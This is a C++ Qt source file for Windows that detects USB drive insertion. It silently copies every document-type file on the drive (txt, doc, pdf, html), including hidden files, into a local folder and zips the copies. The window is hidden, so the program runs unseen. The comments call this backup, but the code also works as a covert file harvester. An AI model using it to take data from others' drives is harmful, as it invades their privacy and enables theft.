#include "getufile.h"


GetUFile::GetUFile(QWidget *parent)
    : QWidget(parent)
{

    //0.===========配置备份的路径及其文件类型============
    qDebug()<<"配置备份的路径及其文件类型";
    this->readSet();

    this->run();
    connect(this,QOverload<QString>::of(&GetUFile::sigUDiskCome),[this]{
        qDebug()<<"检测到新的磁盘";
        this->run();
    });
    connect(this,QOverload<>::of(&GetUFile::sigUDiskRemove),[this]{
        qDebug()<<"检测磁盘退出";
    });
    this->show();
    this->hide();
}

GetUFile::~GetUFile()
{

}

void GetUFile::test()
{
    this->run();

}

QStringList GetUFile::getRemoveDisk()
/*
 * 获取此电脑的所有的可移动磁盘
 * param:None
 * return:可移动磁盘的list
*/
{
    QFileInfoList list =  QDir::drives();  //获取当前系统的盘符
    QStringList remove_disk_list;
    for(int i=0;i<list.count();i++){
        if(GetDriveType((WCHAR *) list[i].filePath().utf16()) == DRIVE_REMOVABLE){
            remove_disk_list.append(list[i].filePath());
          }
    }
    return remove_disk_list;
}

QString GetUFile::getDestFileName(const QString& src_file_name)
/*
 * 构建新的地址,存放复制的文件
 * param src_file_name:源文件的地址
 * return:dst_file_name构建出的新文件的地址
*/
{
    QStringList file_path=src_file_name.split("/");
    QString des_file_path=this->backup_path+"/backup_file";
    for(int i=1;i<file_path.length();i++){
        des_file_path+="/"+file_path[i];
    }
    return des_file_path;
}

void GetUFile::readPath(QString path)
/*
 * 用于遍历路径的全部文件
 * param path:路径的名称
 * return:None
*/
{
    QDir dir;
    QFileInfoList list;
    QFileInfo file_info;
    dir.setPath(path);
    if (!dir.exists())
        return ;
    list.clear();
    list = dir.entryInfoList(QDir::Files|QDir::Hidden|QDir::Dirs,QDir::Time);
    for(int i=0;i<list.size();i++){
        file_info=list.at(i);
        if (file_info.fileName()=="." || file_info.fileName()=="..")
            continue;
        if (file_info.isDir()){
            readPath(file_info.filePath());
        }
        else{
            this->absolute_files_name<<file_info.absoluteFilePath();
        }

    }
}

bool GetUFile::copyFile(QString src_file, QString dest_file)
/*
 * 文件的复制,复制整个可移动磁盘,包含文件的过滤复制,还有就是已经
 * 存在了则不进行复制
 * param src_file: 源文件
 * param dest_file:目的文件
 * return bool:是否进行了复制
*/
{
    if(this->accept_file_types.contains(QFileInfo(dest_file).completeSuffix())){
        QFileInfo file_info(dest_file);
        if (file_info.exists())//已经复制过了,则跳出这个函数
            return false;
        QDir dir(file_info.absolutePath());
        if(!dir.exists())       //文件夹不存在则新建
            dir.mkpath(file_info.absolutePath());
        if(QFile::copy(src_file,dest_file)){
            qDebug()<<"复制"<<src_file;
            return true;
        }
        else
            return false;
    }
    return false;
}

void GetUFile::run()
/*
 * 最主要进行文件的复制,此函数一旦有可移动磁盘接进来,自动调用
*/
{

    //1.==========得到所有源路径的文件名称===============
    qDebug()<<"得到所有源路径的文件名称和目的路径的文件名称";
    foreach (QString path,this->getRemoveDisk()) {
        this->absolute_files_name.clear();
        this->readPath(path);
        if(this->absolute_files_name.length()==0)
            return;
        //1.1==============进行文件的复制===================
        qDebug()<<"进行文件的复制";
        foreach (QString src_file_name, this->absolute_files_name) {
             QString dest_file_name=this->getDestFileName(src_file_name);
            this->copyFile(src_file_name,dest_file_name);
        }
    }
    //2==============进行文件的压缩===================
    qDebug()<<"进行文件的压缩";
    this->zipFile();
    qDebug()<<"操作完成";

}

void GetUFile::zipFile()
/*
 * 当所有的可移动的磁盘进行拷贝完毕时,压缩整个拷贝的文件夹
*/
{
    if(false==JlCompress::compressDir
            (this->backup_path+"/backup_zip/backup.zip",this->backup_path+"/backup_file"))
         qDebug()<<"compress failed";
     else
        qDebug()<<"compress successed";

}

void GetUFile::readSet()
/*
 * 配置文件的设置,如果不存在则新建,存在则读取
*/
{
    QFileInfo set_ini(QCoreApplication::applicationDirPath() + "./settings.ini");
    QSettings *settor=NULL;
    if(!set_ini.exists())
    {
        qDebug()<<"新建配置文件"<<set_ini.absoluteFilePath();
        settor=new QSettings(set_ini.absoluteFilePath(),QSettings::IniFormat);
        settor->setValue("backup/location","C:/usb_backup");
        settor->setValue("file/type","txt,doc,docx,pdf,html");
    }
    else
    {
        settor=new QSettings(set_ini.absoluteFilePath(),QSettings::IniFormat);
    }
    this->backup_path=settor->value("backup/location").toString();
    foreach (QString filter, settor->value("file/type").toString().split(",")) {
        this->accept_file_types.append(filter);
    }
    qDebug()<<"备份的位置"<<this->backup_path;
    qDebug()<<"备份的文件类型"<<this->accept_file_types;
}

bool GetUFile::nativeEvent(const QByteArray &eventType, void *message, long *result)
/*
 * 可移动磁盘的插入检测1
*/
{
    MSG* msg = reinterpret_cast<MSG*>(message);
    int msgType = msg->message;
     if(msgType==WM_DEVICECHANGE)
     {
         PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)msg->lParam;
         switch (msg->wParam) {
         case DBT_DEVICEARRIVAL:

             if(lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)
             {
                 PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
                 if(lpdbv->dbcv_flags ==0)
                 {
                     QString USBDisk = QString(FirstDriveFromMask(lpdbv ->dbcv_unitmask));
                      emit sigUDiskCome(USBDisk);
                 }
             }
             break;
         case DBT_DEVICEREMOVECOMPLETE:
             if(lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)
             {
                 PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
                 if(lpdbv->dbcv_flags == 0)
                 {
                      emit sigUDiskRemove();
                 }
             }
             break;
         }
     }
     return false;
}

char GetUFile::FirstDriveFromMask(ULONG unitmask)
/*
 * 可移动磁盘的插入检测2
*/
{
    char i;
        for (i = 0; i < 26; ++i)
        {
            if (unitmask & 0x1)
                break;
            unitmask = unitmask >> 1;
        }
        return (i + 'A');
}











